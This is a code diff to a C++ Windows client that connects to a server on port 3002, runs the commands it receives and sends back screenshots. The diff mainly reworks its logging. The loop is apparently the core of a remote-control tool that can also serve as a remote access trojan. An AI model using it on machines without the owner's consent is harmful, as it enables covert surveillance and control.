@@ -3,7 +3,7 @@ const int DEFAULT_PORT = 3002;
 
 int network::reworkedClient(char ip[])
 {
-	printf("[+] Attempting connection to %s\n", ip);
+	device::print("[Network] [+] Connecting to %s:%d...", ip, DEFAULT_PORT);
 
 	WSADATA wsaData;
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
@@ -33,13 +33,7 @@ int network::reworkedClient(char ip[])
 		return -1;
 	}
 
-	printf("[+] Successfully connected to %s\n", ip);
-
-	//int fastMode = 0;
-
-	//nlohmann::json connectionInfo = networking::recvData(clientSocket);
-
-	//std::cout << "FASTMODE = " << connectionInfo["fastMode"];
+	device::print("[Network] [+] Connected to %s:%d!", ip, DEFAULT_PORT);
 
 	CommandHandler commandHandler;
 
@@ -47,13 +41,13 @@ int network::reworkedClient(char ip[])
 	{
 		auto data = networking::recvData(clientSocket);
 
-		std::cout << data << "\n";
+		device::print("[Network] [+] Server: %s", data);
 
 		if(data == NULL)
 		{
+			device::ErrorWindow("Connection lost!");
 			return -1;
 		}
-
 
 		networking::ServerPacket serverPacket;
 		serverPacket.parse(data);
@@ -65,8 +59,6 @@ int network::reworkedClient(char ip[])
 			exit(0);
 		}
 
-		printf("Command: %s\n", serverPacket.command.c_str());
-
 		commandHandler.setInput(serverPacket.command);
 
 		data.clear();
@@ -76,13 +68,13 @@ int network::reworkedClient(char ip[])
 		clientPacket.resp = "handled";
 		clientPacket.screenData = commands::Screenshot_C();
 		nlohmann::json clientData = clientPacket.create();
-		std::cout << "ClientData: " << clientData["response"].get<std::string>() << "\n";
 
 		commandHandler.callFunction();
+		commandHandler.clear();
 
-		std::cout << "[+] Sending data\n";
+		device::print("[Network] [+] Sending data...");
 		networking::sendData(clientSocket, clientData);
-		std::cout << "[+] Data sent!\n";
+		device::print("[Network] [+] Data sent!\n");
 	}
 
 	closesocket(clientSocket);
